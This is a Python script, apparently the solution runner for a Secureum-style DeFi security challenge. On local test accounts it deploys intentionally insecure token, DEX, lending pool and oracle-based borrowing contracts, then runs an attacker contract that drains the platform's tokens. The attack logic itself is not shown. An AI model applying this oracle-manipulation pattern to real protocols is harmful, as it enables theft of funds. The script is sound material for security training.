from ape import accounts, project
from .utils.helper import w3, MAX_UINT256

ISEC_TOKENS = w3.to_wei(30000, "ether")
BORING_TOKENS = w3.to_wei(20000, "ether")
DEX_LIQUIDITY = w3.to_wei(100, "ether")
POOL_TOKENS = w3.to_wei(10000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy token
    print("\n--- Deploying Secureum Token and Boring Token ---\n")
    isec_token = project.InSecureumToken.deploy(ISEC_TOKENS, sender=deployer)
    boring_token = project.BoringToken.deploy(BORING_TOKENS, sender=deployer)

    assert isec_token.totalSupply() == ISEC_TOKENS
    assert boring_token.totalSupply() == BORING_TOKENS

    # deploy dex and add liquidity
    print("\n--- Deploying DEX and adding liquidity ---\n")
    dex = project.InsecureDexLP.deploy(
        isec_token.address,
        boring_token.address,
        sender=deployer,
    )
    isec_token.approve(dex.address, MAX_UINT256, sender=deployer)
    boring_token.approve(dex.address, MAX_UINT256, sender=deployer)

    dex.addLiquidity(DEX_LIQUIDITY, DEX_LIQUIDITY, sender=deployer)

    assert isec_token.balanceOf(dex.address) == DEX_LIQUIDITY
    assert boring_token.balanceOf(dex.address) == DEX_LIQUIDITY

    # deploy and fund lending pool
    print("\n--- Deploying and funding Lending Pool ---\n")
    pool = project.InSecureumLenderPool.deploy(
        isec_token.address,
        sender=deployer,
    )
    isec_token.transfer(pool.address, POOL_TOKENS, sender=deployer)

    assert isec_token.balanceOf(pool.address) == POOL_TOKENS

    # deploy and fund lending platform
    print("\n--- Deploying and funding Lending Platform ---\n")
    lending_platform = project.BorrowSystemInsecureOracle.deploy(
        dex.address,
        isec_token.address,
        boring_token.address,
        sender=deployer,
    )
    isec_token.transfer(
        lending_platform.address,
        POOL_TOKENS,
        sender=deployer,
    )
    boring_token.transfer(
        lending_platform.address,
        POOL_TOKENS,
        sender=deployer,
    )
    assert isec_token.balanceOf(lending_platform.address) == POOL_TOKENS
    assert boring_token.balanceOf(lending_platform.address) == POOL_TOKENS

    # define initial balances for attacker and lending platform
    attacker_initial_bal = isec_token.balanceOf(attacker.address) / 10**18
    platform_initial_bal = isec_token.balanceOf(lending_platform.address) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Lending Platform: {platform_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.BorrowSystemAttacker.deploy(
        lending_platform.address,
        dex.address,
        pool.address,
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: Attacker stole all isec tokens from the lending platform ---\n"
    )

    # define ending balances for attacker and lending plarform
    attacker_final_bal = isec_token.balanceOf(attacker.address) / 10**18
    platform_final_bal = isec_token.balanceOf(lending_platform.address) / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Lending Platform: {platform_final_bal}\n---\n"
    )

    assert isec_token.balanceOf(lending_platform.address) == 0
    assert isec_token.balanceOf(attacker.address) == POOL_TOKENS

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
